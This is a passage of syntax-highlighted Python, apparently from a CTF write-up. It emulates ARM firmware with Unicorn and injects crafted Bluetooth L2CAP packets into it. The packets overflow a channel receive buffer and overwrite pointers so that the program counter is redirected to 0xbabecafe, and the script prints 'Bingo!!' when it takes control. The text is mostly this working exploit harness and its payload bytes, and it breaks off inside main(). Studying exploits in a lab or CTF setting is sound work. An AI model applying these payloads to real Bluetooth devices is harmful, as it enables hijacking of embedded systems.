</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">random</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>

<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>

<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>

<span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">emu_cnt</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">emu_cnt</span>
    <span class="c1"># if (address &lt; 0x0203D6E and address &gt;= 0x203D5A):</span>
    <span class="c1">#     print(f&#34;[hook code] 0x{address:x}, {size}, {user_data}&#34;)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>
            <span class="c1"># sleep(3)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D3E</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D3E: r3, r4 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DB4</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DB4: r5 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202AF2</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: len , data&#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20241E</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: payload len &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20247A</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x20247A: channel-&gt;rx_buffer.sdu_length &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202482</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202482: channel-&gt;rx_buffer.current_index &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x2052F0</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x2052F0: p-&gt;state - 1 &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205412</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205412: nevents &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205498</span><span class="p">):</span>
        <span class="n">r3</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205498: poll_requested &#34;</span><span class="p">,</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">r3</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">9</span> <span class="ow">and</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;stop&#34;</span><span class="p">)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">interrupted</span><span class="p">,</span> <span class="n">emu_cnt</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># interrupt </span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
        <span class="n">emu_cnt</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
        <span class="c1"># sleep(3)</span>

        <span class="c1"># save registers</span>
        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
            
        <span class="c1"># execute functions</span>
        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">161</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x20513C</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>

        <span class="c1"># restore</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
        <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>

    <span class="k">pass</span>
    

<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0xbabecafe</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0xbabecafe Bingo!!&#34;</span><span class="p">)</span>
    <span class="k">pass</span>


<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\x05\x00\x14\x00\x0a\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>

<span class="n">channel_rx_buffer</span> <span class="o">=</span> <span class="mh">0x200008d4</span>
<span class="n">pc_controlled</span> <span class="o">=</span> <span class="mh">0xbabecafe</span>

<span class="n">packet_injected_2</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body_2</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>


<span class="c1"># override notification_process</span>
<span class="n">packet_injected_3</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body_3</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aa&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aafaaagaaahaaaiaaaja&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>

<span class="c1"># override process_list</span>
<span class="n">packet_injected_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
<span class="n">packet_body_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;xaaayaaazaabbaabcaabdaabeaabfa&#34;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>


<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet_body</span><span class="p">,</span> <span class="n">packet_body_2</span><span class="p">,</span> <span class="n">packet_injected_2</span><span class="p">,</span> <span class="n">packet_body_3</span><span class="p">,</span> <span class="n">packet_injected_3</span><span class="p">,</span> <span class="n">emu_cnt</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body</span><span class="p">[</span><span class="n">packet_injected</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_2</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">[</span><span class="n">packet_injected_2</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_2</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_3</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">[</span><span class="n">packet_injected_3</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_3</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&lt;=</span><span class="mi">7</span> <span class="ow">and</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">][</span><span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>


        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>

    <span class="c1"># memory regions</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>

    <span class="c1"># load ROM</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># write memory / patch code</span>
    <span class="c1"># TODO: maybe some patching needed?</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch fade, POP {R4-R6,PC}</span>
